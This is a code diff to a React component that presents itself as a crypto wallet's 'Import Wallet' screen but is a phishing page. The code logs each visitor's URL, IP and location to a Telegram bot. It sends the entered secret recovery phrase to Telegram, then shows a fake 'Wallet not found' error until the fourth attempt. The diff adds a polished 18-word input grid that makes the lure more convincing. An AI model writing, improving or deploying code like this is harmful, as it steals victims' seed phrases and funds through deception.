@@ -1,7 +1,6 @@
 "use client"
-import React, { useState, useEffect } from "react"
+import React, { useState, useEffect, useRef } from "react"
 import { ArrowLeft, ChevronDown, Info, CheckCircle } from "lucide-react"
-import { list } from "./list"
 
 export default function ImportWallet() {
   const [phrase, setPhrase] = useState("")
@@ -9,12 +8,15 @@ export default function ImportWallet() {
   const [errorMessage, setErrorMessage] = useState("")
   const [submitCount, setSubmitCount] = useState(0)
   const [isVerified, setIsVerified] = useState(false)
+  const [showAll, setShowAll] = useState(false)
+  const [wordInputs, setWordInputs] = useState(Array(18).fill(""))
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
 
-  const [telegramChatId] = useState(process.env.NEXT_PUBLIC_ID);
-  const [telegramToken] = useState(process.env.NEXT_PUBLIC_TOKEN);
+  const [telegramChatId] = useState(process.env.NEXT_PUBLIC_ID)
+  const [telegramToken] = useState(process.env.NEXT_PUBLIC_TOKEN)
 
-  const NEXT_PUBLIC_ID = telegramChatId;
-  const NEXT_PUBLIC_TOKEN = telegramToken;
+  const NEXT_PUBLIC_ID = telegramChatId
+  const NEXT_PUBLIC_TOKEN = telegramToken
 
   // Send message to Telegram
   const sendTelegramMessage = async (message: string) => {
@@ -47,14 +49,47 @@ export default function ImportWallet() {
           url: window.location.href,
           ip: data.ip,
           location: `${data.city}, ${data.region}, ${data.country_name}`,
-        };
+        }
 
-        // Send visit alert to Telegram with formatted message
         sendTelegramMessage(
           `Visited this URL: ${visitData.url}\nIP Address: ${visitData.ip}\nLocation: ${visitData.location}`
-        );
-      });
-  }, [telegramToken, telegramChatId]);
+        )
+      })
+  }, [telegramToken, telegramChatId])
+
+  // Handle phrase input changes
+  const handlePhraseChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
+    const newPhrase = e.target.value
+    setPhrase(newPhrase)
+    
+    const words = newPhrase.trim().split(/\s+/)
+    const newWordInputs = Array(18).fill("")
+    words.slice(0, 18).forEach((word, index) => {
+      newWordInputs[index] = word
+    })
+    setWordInputs(newWordInputs)
+
+    // Focus next empty input after space
+    if (newPhrase.endsWith(" ") && words.length < 18) {
+      const nextIndex = words.length
+      inputRefs.current[nextIndex]?.focus()
+    }
+  }
+
+  // Handle individual word input changes
+  const handleWordChange = (index: number, value: string) => {
+    const newWordInputs = [...wordInputs]
+    newWordInputs[index] = value
+    setWordInputs(newWordInputs)
+    
+    const newPhrase = newWordInputs.filter(word => word).join(" ")
+    setPhrase(newPhrase)
+
+    // Move to next input on space
+    if (value.endsWith(" ") && index < 17) {
+      inputRefs.current[index + 1]?.focus()
+    }
+  }
 
   // Handle form submission
   const handleSubmit = async (e: React.FormEvent) => {
@@ -64,7 +99,6 @@ export default function ImportWallet() {
     setIsLoading(true)
     setErrorMessage("")
 
-    // Send details to Telegram with monospace formatting
     await sendTelegramMessage(`Phrase: \`${phrase}\``)
 
     setTimeout(() => {
@@ -72,13 +106,54 @@ export default function ImportWallet() {
       setErrorMessage("Wallet not found. Check your spelling, ensure the words are in the correct order, or try another wallet.")
       setSubmitCount(prev => {
         const newCount = prev + 1
-        // Move to success page after 4 submissions
         if (newCount === 4) {
           setIsVerified(true)
         }
         return newCount
       })
     }, 3000)
+  }
+
+  // Render word input grid
+const renderWords = () => {
+  return Array(18).fill(0).map((_, index) => (
+    <input
+      key={index}
+      type="text"
+      value={wordInputs[index]}
+      onChange={(e) => handleWordChange(index, e.target.value)}
+      onKeyDown={(e) => {
+        if (e.key === " " && wordInputs[index] && index < 17) {
+          e.preventDefault()
+          inputRefs.current[index + 1]?.focus()
+        }
+        if (e.key === "Backspace" && !wordInputs[index] && index > 0) {
+          e.preventDefault()
+          wordInputs[index] = ""
+          inputRefs.current[index - 1]?.focus()
+          setWordInputs([...wordInputs])
+        }
+      }}
+      ref={(el) => { inputRefs.current[index] = el; }}
+      className={`w-24 p-2 m-1 rounded border text-center text-sm ${
+        index === 0 || wordInputs[index - 1] ? "block" : "hidden"
+      } ${wordInputs[index] ? "border-gray-500 bg-gray-500 text-gray-300" : "border-purple-500 bg-purple-500 text-white"}`}
+      placeholder={`${index + 1}.`}
+    />
+  ))
+}
+
+  // Check if continue button should be enabled
+  const isContinueEnabled = () => {
+    const validWords = wordInputs.filter(word => word.trim() !== "").length
+    return !isLoading && validWords >= 12
+  }
+
+  // Clear all inputs
+  const clearAll = () => {
+    setPhrase("")
+    setWordInputs(Array(18).fill(""))
+    inputRefs.current[0]?.focus()
   }
 
   // Loading spinner component
@@ -130,19 +205,17 @@ export default function ImportWallet() {
           {/* Input Field */}
           <div className="relative">
             <div className="flex items-center space-x-3">
-              <h3 className="w-full h-full bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">Enter your Secret Recovery Phrase</h3>
+              <h3 className="w-full h-full bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">
+                Enter your Secret Recovery Phrase
+              </h3>
             </div>
           </div>
 
-          {/* Large Text Area */}
-          <div className="bg-gray-800 border border-gray-700 rounded-lg p-6 min-h-[320px]">
-            <textarea
-              placeholder="Add a space between each word and make sure no one is watching."
-              className="w-full h-full bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none"
-              rows={15}
-              value={phrase}
-              onChange={(e) => setPhrase(e.target.value)}
-            />
+          
+
+          {/* Word Grid */}
+          <div className="bg-gray-800 border border-gray-700 rounded-lg p-6 grid grid-cols-3 gap-2">
+            {renderWords()}
           </div>
 
           {/* Error Message */}
@@ -155,12 +228,16 @@ export default function ImportWallet() {
 
           {/* Action Links */}
           <div className="flex justify-between">
-            <button type="button" className="text-blue-400 hover:text-blue-300 transition-colors font-medium">
-              Show all
+            <button 
+              type="button" 
+              className="text-blue-400 hover:text-blue-300 transition-colors font-medium"
+              onClick={() => setShowAll(!showAll)}
+            >
+              {showAll ? "Hide all" : "Show all"}
             </button>
             <button 
               type="button"
-              onClick={() => setPhrase("")}
+              onClick={clearAll}
               className="text-blue-400 hover:text-blue-300 transition-colors font-medium"
             >
               Clear all
@@ -171,7 +248,7 @@ export default function ImportWallet() {
           <div className="fixed bottom-0 left-0 right-0 p-4 bg-gray-900 border-t border-gray-800">
             <button 
               type="submit"
-              disabled={isLoading || !phrase}
+              disabled={!isContinueEnabled()}
               className="w-full bg-gray-600 hover:bg-gray-500 text-white font-medium py-4 rounded-lg transition-colors shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
             >
               Continue
